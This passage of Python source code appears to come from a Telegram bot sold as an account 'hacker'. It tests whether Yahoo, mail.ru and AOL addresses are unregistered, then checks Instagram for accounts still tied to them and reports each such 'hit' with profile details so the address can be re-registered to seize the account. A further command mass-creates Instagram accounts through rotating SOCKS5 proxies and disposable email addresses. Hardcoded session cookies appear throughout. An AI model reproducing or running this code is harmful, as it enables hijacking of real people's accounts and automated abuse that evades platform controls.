					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(me.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='yahoo.com':
				email = email
				user = user
				url = "https://login.yahoo.com/?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com"
				headers = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '1415','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'B=134vcn5g2bbpe&b=3&s=qj; GUC=AQEBAQFgJwBgL0IbewRH; A1=d=AQABBC6vJWACEP3J2yDNTyPDcwvbCLnskxEFEgEBAQEAJ2AvYAAAAAAA_SMAAAcILq8lYLnskxE&S=AQAAAqvidgG6yaSrmxk9va8BlxE; A3=d=AQABBC6vJWACEP3J2yDNTyPDcwvbCLnskxEFEgEBAQEAJ2AvYAAAAAAA_SMAAAcILq8lYLnskxE&S=AQAAAqvidgG6yaSrmxk9va8BlxE; A1S=d=AQABBC6vJWACEP3J2yDNTyPDcwvbCLnskxEFEgEBAQEAJ2AvYAAAAAAA_SMAAAcILq8lYLnskxE&S=AQAAAqvidgG6yaSrmxk9va8BlxE&j=US; APID=UP41556690-6cb8-11eb-b3a4-0efff797295b; AS=v=1&s=6TWShzYC&d=A60274359|fsC2pD_.2SrPGM4_bsUz35krL9lhVhDkgjs9oXhsOxLn_6Pc8hBjqHW0tTZUOKxW1Y1zSIIqV8njXb.PBOrxDRrXfhwt_k3YX3tVb81JTLriH_Tszus2YORvYGHtNqXPE9F3yHfGj1tRrEMx3QS.xMnEUgRFk9i7ryR0Yf4bO6UwBY4r9bm8AQ.ASviERdysUeNgsFL6cnVVXVGvohfu9Bixh1Dhcc.hiQbM3oiuT6i1Guq0OA.B.gbjd5uXDRZWa0TyIcA8o9NWtu4Xwkod651B5mJVX7OKf8dgbZ.WuLfII7hGEuJIQumcrF0lYSa00bdoHOJITDfIdrZsEOMwapuC8PgyQ7TdTSE7Se2StSmyHt_OHimT4ok1EBYs7obzq9djkL8sdqhQN09zuM.P0vAZbVbbRKNm26l4_7tX8TvedU5dU.XVEOaEfsRKNGvwIhGRO2q7Moz548rof9QZ2j0UkWnjxx4gsEg_63pSZBdZdOiTfkYVYG.D0NO9AWtKGxpheNXOVt8Wxbx_140af0gQ5xSP1cnJU0SjUmj5Ru9doNFEZRGBniEM5cgPEB35OJH3.53XBu52SHyBa7AyJb7eedqqLgadHLn0SmgY8MX56DWB81WOIquyAgMknkBsf6MztjUZISotk83.TPxF93mIfVUWGQ2JsLKC1y_HFDE5JKNx0zoUs7X4MGDCZOQ6jHxB_Ay5TL_vBBZNiWTPzx1WZqow478Le27Q1YoypN5DY_eUfEtfvRJYPtgkHTyS3vABoI8FDC8sLMuuGhc_UjISybNAec2MNdBue96hR8Ni_B1GtP9Vcxfb18x4aZPan.j5.SP4jIYb_wIaIzxjVWYQ6sAJ5NKWWkzHpvxLEinGMde9mfqfBhcOk_rsAEf8XvNv3Ng-~A|C6027014a|FdYuFQD.2Ro5V4q.0EICg_TJUsTz2fCnS0hMzUGvjdLSyX_oe5h3q4pMKSj6upQIIsoS4ZGwTPbxmSx2tRJ7K0ASoA8nNws0p1Qhj7VLTdCTg0zvsfWcgRbzmA0TsCev.pDmairFLmKeHRGB5KsiPOQ1gp3gE_uYOCsMI_X.u.j0p70ia_YSl2jN04k3C50BMKFnfHloILTsDqu87JQF3xDv1LQS8fZICBqfQFEKsUHiRG6L.RCDLHle6V7Zfw170TuTyk5RojQHApkSAGNxyjuSyogaUBcO78_7DlZ3sH4jPeT5poE5M7vi1iyKDS0J0cLHV3kvaJJ_BwY.5pSMfl3XFl.tXlGZQ46RNXoffG7JkBPIQIqLtdiBRA5CU7oVKHFNVQzr24hOhTBx1H9nSeIbniTdnMA214dJ0yxQaxJ7m99RBq8O0vRzqSUmJ2rwSJZREkF3WIk7YAk4GB1BBDle91xLMqMqneJV3PmeTeRjIebH5fFQXjtek3lm1TkRJtt8XUU0U8Lpb5tjHE.LCN9rI_e..bLssuRUZXPZPMqE.8.abHk_VgDnsFf3hn81hopLbddNv11YkwAYO3m7bZQ8Ac5ko9eGUMQA5seI1nLX2ePDXp48qW__nG2e4r0BcevG68vtN4oezAS9W.k4prsy3fLEZiIeLgOcij_18OJAdEZsz.5keMZpxnlwmg5vZL.65dP5gFMfhd9WfgPSBLUM4DS7FiN.R9QgqfR.MD8MSI.yA27JorZqNyCZvBonkFkdv_SjVx67wmwsD0ExysXXz13W12.pAHKPD6HXWhvEw7VAJFPTV_vJm6p3Th8OPrgKgLhgqzwZgeM4ST0gOXwJfuIaspB2zJkjL7ZaZ_RMYsp7nuc29Qmx6k.y.lTVDwCCJzF70A5tQxKPRUMZPJCW8xRlpev2uzp3RbE_0qxPFogAdpqdxn.hZD10GT_fkZfQdNOwT99g87NCV1gQ79GDE_K41cynxh1acViZYWjJUOps8rIO2.MUgbMJiK5URAhdUKU9x7dYN9ozxrMJDDMLdx2iQGm1UJWfz7PBkEVZhJD1SDH2uvBhbn6tLhhU0tIylDoJkRXMPZgW3II-~A; APIDTS=1613099483','Host': 'login.yahoo.com','Origin': 'https://login.yahoo.com','Referer': 'https://login.yahoo.com/?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': str(generate_user_agent()),'X-Requested-With': 'XMLHttpRequest'}
				data = {'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":0,"timezone":"UTC","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"touchSupport":{"points":10,"event":0,"start":0},"fonts":{"count":33,"hash":"edeefd360161b4bf944ac045e41d0b21"},"audio":"124.04347527516074","resolution":{"w":"1456","h":"818"},"availableResolution":{"w":"778","h":"1456"},"ts":{"serve":1613099481853,"render":1613099482712}}','crumb': 'uQN26u0FMre','acrumb': '6TWShzYC','sessionIndex': 'QQ--','displayName': '','deviceCapability': '{"pa":{"status":false}}','username': str(email),'passwd': '','signin': 'Berikutnya','persistent': 'y'}
				response = requests.post(url, data=data, headers=headers)
				if ('"error":"messages.INVALID_USERNAME"') in response.text:
					ya+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(me.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='mail.ru':
				email = email
				user = user
				url = "https://account.mail.ru/api/v1/user/exists"
				headers = {"User-Agent": str(generate_user_agent())}
				data = {'email': str(email)}
				response = requests.post(url, data=data, headers=headers)
				if str(response.json()['body']['exists']) == 'False':
					mr+=1
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(me.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='aol.com':
				email = email
				user = user
				eml = user
				headers = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '18536','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'BX=05cdflhgh88dv&b=3&s=fa; GUC=AQEBAQFhFXNhHkIeKASA; rxx=230ufm9rd1p.2ffkvhk6&v=1; A1=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA; A3=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA; A1S=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA&j=WORLD; AS=v=1&s=9Ach1eVW&d=A6115734a|.jJjUM3.2Sq6mpRaeUvGOFaxkilDMMNq9Ri7WiuICAYOOQc8JzylVD7TqAyOQXyoGr3xjU5It2l8d2Tm2XplfzH_3CxVMv80ojV9Z2.2KK3pELyejomUkEej8.XfKekex.Y8YC.aN2I_2SK8dJrsij_oAiqz0F5q_AxGBEXANzyyOUk4SZBvgOyRlOVZZfqe1tH9zRhKo2pZ1sSrbHl3et7WTdq75c9ftrqF99EdnVhfX55FDU1s18vjW7yhqwnAR4wuzvLUp53LxbG0XAVElc29r1qDyJ5FaMTplnZzc8qs73k0YQ5CBNdeyLQh6_xlUZDPF3EaPrn9XaJEL_IRPJTt9lh7cFMDyMygjEjL3c9.vDyB7bwl6yDEgtWrB0TolID0D_m3WNruvGdsfqqTKHJO.tFLx00tnx_aYJqqVhmRTi_UgdGMAwv_Ns3eT_Ole8uf5okFWiVAN1Att2io_NuZsS3h6kOWMkER6k3h2isdL4pnCJPoskQTs2gDRo.CaRjcNBQk_v985XvaIGGYsw3Kcgm0ZZk.ni3fv.4uUvpxB431Xi_LLXeObPrKXrlLMVNiiAGEwv.0m5TtV41ib11dBba3jtsohTqUZpwIYEU4M4KF3G_N.2SfLRVYMUiNgOlO2ZLmxQmfWGPdysVpSo.UlJUUqEbKPZzJpH4Y_z8BWOeSjIEW9XOKCyf.ZeoXJufQVU5oS1V0_PydswVuYN7c2dOvWA.E7jrTMlPo3ZzaqshPohpubodq8ofYN9UowbOL8eYnyIKny.YvjJb6KLrCr0jersbNU1Z3pBHQutbA9l2iyl4RkMs01sRnL2PVa94n42RmMIEiVYvecUGO~A','Host': 'login.aol.com','Origin': 'https://login.aol.com','Referer': 'https://login.aol.com/account/create?intl=us&src=fp-us&.done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DkYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E&specId=yidReg&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DkYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E','Sec-Ch-Ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"','Sec-Ch-Ua-Mobile': '?0','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': str(generate_user_agent()),'X-Requested-With': 'XMLHttpRequest'}
				data = {'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1628709339039,"render":1628709338648}}','specId': 'yidreg','crumb': 'H4.yvLRdejE','acrumb': '9Ach1eVW','done': 'https://api.login.aol.com/oauth2/authorize?client_id=dj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2&intl=us&nonce=kYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0&redirect_uri=https%3A%2F%2Foidc.www.aol.com%2Fcallback&response_type=code&scope=mail-r+openid+openid2+sdps-r&src=fp-us&state=eyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E','attrSetIndex': '0','tos0': 'oath_freereg|us|en-US','firstName': 'dlsdl','lastName': 'alo','yid': str(eml),'password': 'https://t.me/SidraTools','shortCountryCode': 'US','phone': '2097635173','mm': '1','dd': '5','yyyy': '2000','freeformGender': '','signup': '' }
				response = requests.post('https://login.aol.com/account/module/create?validateField=yid', data=data, headers=headers)
				if str('"yid"') in str(response.text):
					bad+=1
				else:
					ya+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(me.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")					
#	elif me.text == '/cinsta' or me.text == '/cinsta@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/uinsta' or me.text == '/uinsta@CH_IG_FB_TK_SNAP_BOT':

	elif me.text == '/ginsta' or me.text == '/ginsta@CH_IG_FB_TK_SNAP_BOT':
		while True :
			pro = requests.get('https://gimmeproxy.com/api/getProxy')
			if '"protocol"' in pro.text or '"ip"' in pro.text or '"port"' in pro.text:
				if str(pro.json()['protocol']) == 'socks5':
					proxy = str(pro.json()['curl'])
					bot.send_message(me.chat.id,"¶** جاري انشاء الحساب لطفا انتظر بعض ثواني ** : ",parse_mode = "markdown")
					uid = uuid4()
					Coke=secrets.token_hex(8)*8
					ssid = secrets.token_hex(8)*2
					r = requests.session()
					ERR = 0
					rem = requests.get('https://10minutemail.net/address.api.php',headers = {'cookie':'PHPSESSID='+ssid},proxies={'socks5':proxy})
					email = rem.json()['mail_get_mail']
					bot.send_message(me.chat.id, '**Done Get Email : {}**'.format(email),parse_mode = "markdown")
					num ="0123456789asdfghjklpoiuytrewqzxcvbnm"
					rand=''.join(random.choice(num)for man in   range(8))
					username='medo'+rand
					pas='@ONCLIK-@UT_UB'
					head={'Host': 'www.instagram.com','Cookie': Coke,'User-Agent': generate_user_agent(),'Accept': '*/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','X-Csrftoken': 'missing','X-Instagram-Ajax': 'missing','X-Ig-App-Id': '936619743392459','X-Asbd-Id': '437806','X-Ig-Www-Claim': 'hmac.AR13pf0XdQA_XNAYLrmGWOJtWRr9WkLRRw_dNGcK6i1C5a_k','Content-Type': 'application/x-www-form-urlencoded','X-Requested-With': 'XMLHttpRequest','Content-Length': '432','Origin': 'https://www.instagram.com','Referer': 'https://www.instagram.com/accounts/emailsignup/','Te': 'trailers','Connection': 'close'}
					head_get_code={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '67','content-type': 'application/x-www-form-urlencoded','cookie': Coke,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(),'x-asbd-id': '437806','x-csrftoken': 'missing','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': 'missing',}
					head={'Host': 'www.instagram.com','Cookie': Coke,'User-Agent': generate_user_agent(),'Accept': '*/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','X-Csrftoken': 'missing','X-Instagram-Ajax': 'missing','X-Ig-App-Id': '936619743392459','X-Asbd-Id': '437806','X-Ig-Www-Claim': 'hmac.AR13pf0XdQA_XNAYLrmGWOJtWRr9WkLRRw_dNGcK6i1C5a_k','Content-Type': 'application/x-www-form-urlencoded','X-Requested-With': 'XMLHttpRequest','Content-Length': '432','Origin': 'https://www.instagram.com','Referer': 'https://www.instagram.com/accounts/emailsignup/','Te': 'trailers','Connection': 'close'}
					data_age={'day': '27','month': '8','year': '2000'}
					data_attemp={'email': email,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{pas}','username': username,'first_name': 'BY HIMA - @ar_programmers','client_id': uid,'seamless_login_enabled': '1','opt_into_one_tap': 'false',}
					data_get_code={'device_id': uid,'email': email}
					req_attemp=requests.post(f'https://www.instagram.com/accounts/web_create_ajax/attempt/',headers=head,data=data_attemp,proxies={'socks5':proxy})
					req_age=requests.post(f'https://www.instagram.com/web/consent/check_age_eligibility/',headers=head,data=data_age,proxies={'socks5':proxy})
					req_get_code=requests.post(f'https://i.instagram.com/api/v1/accounts/send_verify_email/',headers=head_get_code,data=data_get_code,proxies={'socks5':proxy})
					bot.send_message(me.chat.id, '**GETING THE CODE ...... **',parse_mode = "markdown")
					sleep(15)
					rei = requests.post('https://10minutemail.net/address.api.php',headers = {'cookie':'PHPSESSID='+ssid},proxies={'socks5':proxy}).text
					code = rei.split(',"subject":"')[1].split(' is')[0]
					data_send_code={'code': code,'device_id': uid,'email': email}
					req_send_code=requests.post(f'https://i.instagram.com/api/v1/accounts/check_confirmation_code/',headers=head_get_code,data=data_send_code,proxies={'socks5':proxy})
					singup_code=req_send_code.json()['signup_code']
					data_crate={'email': email,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{pas}','username': username,'first_name': 'By HIMA','month': '8','day': '27','year': '2002','client_id':uid,'seamless_login_enabled': '1','tos_version': 'row','force_sign_up_code': singup_code,}
					req_crate=requests.post(f'https://www.instagram.com/accounts/web_create_ajax/',headers=head,data=data_crate,proxies={'socks5':proxy})
					bot.send_message(me.chat.id, '**Done GrEaT AccOuNt :** `{}:{}`\n sessionid : `{}`'.format(email,pas,ssid),parse_mode = "markdown")
				else:
					bot.send_message(me.chat.id,"¶** خطأ في الخادم جاري احظار خادم شغال\n¶ ERORR PROXY SERCH IT **",parse_mode = "markdown")
			else:
				bot.send_message(message.chat.id, '**ERORR PROXY **',parse_mode = "markdown")
#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':

